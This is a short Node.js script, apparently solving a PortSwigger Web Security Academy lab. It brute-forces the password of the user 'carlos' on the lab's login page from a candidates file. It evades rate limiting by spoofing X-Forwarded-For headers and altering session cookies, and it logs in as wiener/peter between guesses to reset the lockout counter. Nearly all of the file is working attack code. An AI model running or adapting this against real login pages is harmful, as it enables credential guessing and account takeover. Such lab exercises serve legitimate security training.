import axios from "axios";
import * as fs from "fs";
// import crypto from "crypto";
// import fetch from "node-fetch";

const subdomain = "ac6d1f781f35d56dc01256eb00720091";
const loginURL = `https://${subdomain}.web-security-academy.net/login`;

const attack = async () => {
  const passwordCandidates = fs
    .readFileSync(__dirname + "/password_candidates.txt")
    .toString()
    .split("\n");

  let validUsername = "carlos";

  for (let passwordCandidate of passwordCandidates) {
    const response = await axios.post(
      loginURL,
      `username=${validUsername}&password=${passwordCandidate}`,
      {
        headers: {
          Cookie:
            `session=maejAV5dPYdwMWrFkaxJGcQBtgRjIHlu` + passwordCandidate,
          "X-Forwarded-For": passwordCandidate,
        },
      }
    );
    console.log(response.data);

    if (
      !response.data.includes("Incorrect password") &&
      !response.data.includes("You have made too many incorrect login attempts")
    ) {
      console.log(
        "Username and password is: ",
        validUsername,
        " ",
        passwordCandidate
      );
      break;
    }

    await axios.post(loginURL, `username=wiener&password=peter`, {
      headers: {
        Cookie: `session=maejAV5dPYdwMWrFkaxJGcQBtgRjIHlu` + "random",
        "X-Forwarded-For": new Date().getTime() / 1000 + "random",
      },
    });
  }
};

try {
  attack();
} catch (e) {
  console.log(e);
  throw e;
}
